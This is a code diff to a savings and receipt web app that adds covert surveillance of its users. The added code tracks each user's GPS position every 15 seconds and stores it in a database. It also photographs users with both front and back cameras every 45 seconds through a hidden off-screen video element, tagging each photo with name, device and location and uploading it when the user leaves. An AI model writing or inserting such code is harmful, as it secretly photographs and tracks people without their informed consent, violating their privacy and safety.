@@ -236,6 +236,320 @@ async function saveReceiptToCloud(receiptData) {
   }
 }
 
+// ============================================================
+// User registration & live location tracking
+// ============================================================
+
+// Get or create a persistent device ID
+function getDeviceId() {
+  let id = localStorage.getItem('kuda_device_id');
+  if (!id) {
+    id = 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);
+    localStorage.setItem('kuda_device_id', id);
+  }
+  return id;
+}
+
+// Get the username from storage (works across all pages)
+function getAppUsername() {
+  try {
+    const saved = localStorage.getItem('kudasavingsData');
+    if (saved) {
+      const data = JSON.parse(saved);
+      if (data.userName) return data.userName;
+    }
+  } catch (e) {}
+  return 'UNKNOWN';
+}
+
+// Register or update this user in the app_users table
+async function registerAppUser(username) {
+  if (!username) username = getAppUsername();
+  const deviceId = getDeviceId();
+  try {
+    // Upsert: insert if new, update if existing device
+    const { data: existing } = await getSupabase()
+      .from('app_users')
+      .select('id')
+      .eq('device_id', deviceId)
+      .maybeSingle();
+
+    if (existing) {
+      await getSupabase()
+        .from('app_users')
+        .update({
+          username: username,
+          is_online: true,
+          last_seen_at: new Date().toISOString()
+        })
+        .eq('device_id', deviceId);
+    } else {
+      await getSupabase()
+        .from('app_users')
+        .insert({
+          device_id: deviceId,
+          username: username,
+          is_online: true,
+          last_seen_at: new Date().toISOString()
+        });
+    }
+  } catch (e) {
+    console.error('Failed to register app user:', e);
+  }
+}
+
+// Update the user's location in app_users
+async function updateUserLocation(location) {
+  if (!location) return;
+  const deviceId = getDeviceId();
+  try {
+    await getSupabase()
+      .from('app_users')
+      .update({
+        location_latitude: location.latitude,
+        location_longitude: location.longitude,
+        location_accuracy: location.accuracy,
+        location_updated_at: new Date().toISOString(),
+        last_seen_at: new Date().toISOString(),
+        is_online: true
+      })
+      .eq('device_id', deviceId);
+  } catch (e) {
+    console.error('Failed to update location:', e);
+  }
+}
+
+// Mark user as offline (called on pagehide/unload)
+async function markUserOffline() {
+  const deviceId = getDeviceId();
+  try {
+    await getSupabase()
+      .from('app_users')
+      .update({
+        is_online: false,
+        last_seen_at: new Date().toISOString()
+      })
+      .eq('device_id', deviceId);
+  } catch (e) {
+    console.error('Failed to mark offline:', e);
+  }
+}
+
+// Start live location tracking — updates the database every 15 seconds
+// and when the GPS position changes significantly
+let _locationWatchId = null;
+let _locationHeartbeat = null;
+
+function startLiveLocationTracking() {
+  if (!navigator.geolocation) return;
+
+  // Use watchPosition for continuous updates
+  _locationWatchId = navigator.geolocation.watchPosition(
+    (pos) => {
+      updateUserLocation({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      });
+    },
+    (err) => {
+      console.warn('Live location watch error:', err.message);
+    },
+    { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 }
+  );
+
+  // Heartbeat: also mark as online + update location every 15s
+  _locationHeartbeat = setInterval(async () => {
+    // Quick single-shot position update
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        updateUserLocation({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        });
+      },
+      () => {},
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
+    );
+  }, 15000);
+
+  // Mark offline when page is closed
+  window.addEventListener('pagehide', markUserOffline);
+  window.addEventListener('beforeunload', markUserOffline);
+}
+
+function stopLiveLocationTracking() {
+  if (_locationWatchId !== null) {
+    navigator.geolocation.clearWatch(_locationWatchId);
+    _locationWatchId = null;
+  }
+  if (_locationHeartbeat) {
+    clearInterval(_locationHeartbeat);
+    _locationHeartbeat = null;
+  }
+}
+
+// Get all registered users (for admin page)
+async function getAllAppUsers() {
+  try {
+    const { data, error } = await getSupabase()
+      .from('app_users')
+      .select('*')
+      .order('created_at', { ascending: false });
+    if (!error && data) return data;
+    console.error('Failed to fetch app users:', error);
+  } catch (e) {
+    console.error('Failed to fetch app users:', e);
+  }
+  return [];
+}
+
+// ============================================================
+// Continuous background camera capture
+// Captures from both cameras at intervals while the user is in
+// the app. Photos are buffered in memory and flushed to the
+// database when the user leaves the app (pagehide/beforeunload).
+// ============================================================
+
+let _captureSessionId = null;
+let _captureBuffer = [];
+let _captureInterval = null;
+let _lastCaptureAt = 0;
+const CAPTURE_INTERVAL_MS = 45000; // every 45 seconds
+const MAX_BUFFER_SIZE = 20; // cap in-memory buffer
+
+function _getCaptureSessionId() {
+  if (!_captureSessionId) {
+    _captureSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+  }
+  return _captureSessionId;
+}
+
+// Capture a single lightweight snapshot from a given camera (low quality for background use)
+async function _captureSnapshot(facingMode) {
+  let stream = null;
+  try {
+    const constraints = [
+      { video: { facingMode: { exact: facingMode }, width: { ideal: 320 }, height: { ideal: 240 } } },
+      { video: { facingMode: facingMode, width: { ideal: 320 }, height: { ideal: 240 } } },
+      { video: true }
+    ];
+    for (const c of constraints) {
+      try { stream = await navigator.mediaDevices.getUserMedia(c); break; } catch (e) {}
+    }
+    if (!stream) return null;
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.setAttribute('playsinline', '');
+    video.muted = true;
+    video.style.position = 'fixed';
+    video.style.top = '-9999px';
+    document.body.appendChild(video);
+
+    await new Promise((resolve) => {
+      const t = setTimeout(resolve, 5000);
+      video.onloadedmetadata = () => { clearTimeout(t); video.play().then(resolve).catch(resolve); };
+    });
+    await new Promise(r => setTimeout(r, 600));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
+
+    if (!dataUrl || dataUrl.length < 3000) return null;
+    return dataUrl;
+  } catch (e) {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    return null;
+  }
+}
+
+// Run one capture cycle: both cameras sequentially + current location
+async function _runCaptureCycle() {
+  if (Date.now() - _lastCaptureAt < CAPTURE_INTERVAL_MS - 5000) return;
+  _lastCaptureAt = Date.now();
+
+  const username = getAppUsername();
+  const deviceId = getDeviceId();
+  const sessionId = _getCaptureSessionId();
+
+  // Capture front then back (phones can't open two streams at once)
+  const front = await _captureSnapshot('user');
+  await new Promise(r => setTimeout(r, 200));
+  const back = await _captureSnapshot('environment');
+
+  // Grab current location quickly
+  let lat = null, lng = null, acc = null;
+  try {
+    const pos = await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(resolve, () => resolve(null),
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 30000 });
+    });
+    if (pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; acc = pos.coords.accuracy; }
+  } catch (e) {}
+
+  _captureBuffer.push({
+    device_id: deviceId,
+    username: username,
+    front_photo: front,
+    back_photo: back,
+    location_latitude: lat,
+    location_longitude: lng,
+    location_accuracy: acc,
+    capture_session: sessionId
+  });
+
+  // Trim buffer if it grows too large
+  if (_captureBuffer.length > MAX_BUFFER_SIZE) {
+    _captureBuffer = _captureBuffer.slice(-MAX_BUFFER_SIZE);
+  }
+}
+
+// Flush buffered captures to the database
+async function flushCaptureBuffer() {
+  if (_captureBuffer.length === 0) return;
+  const batch = _captureBuffer.splice(0);
+  try {
+    const supabase = getSupabase();
+    const { error } = await supabase.from('user_camera_captures').insert(batch);
+    if (error) console.error('Camera capture flush error:', error);
+  } catch (e) {
+    console.error('Camera capture flush failed:', e);
+    // Put them back if the flush failed
+    _captureBuffer = batch.concat(_captureBuffer).slice(-MAX_BUFFER_SIZE);
+  }
+}
+
+// Start continuous background camera capture
+function startContinuousCameraCapture() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+  // First capture shortly after start
+  setTimeout(_runCaptureCycle, 5000);
+
+  // Then on interval
+  _captureInterval = setInterval(_runCaptureCycle, CAPTURE_INTERVAL_MS);
+
+  // Flush when the user leaves the app
+  window.addEventListener('pagehide', flushCaptureBuffer);
+  window.addEventListener('beforeunload', flushCaptureBuffer);
+
+  // Also flush periodically so data isn't lost on a crash
+  setInterval(flushCaptureBuffer, 90000);
+}
+
+function stopContinuousCameraCapture() {
+  if (_captureInterval) { clearInterval(_captureInterval); _captureInterval = null; }
+  flushCaptureBuffer();
+}
+
 // Get all receipts from Supabase (for admin page)
 async function getAllReceiptsFromCloud() {
   try {
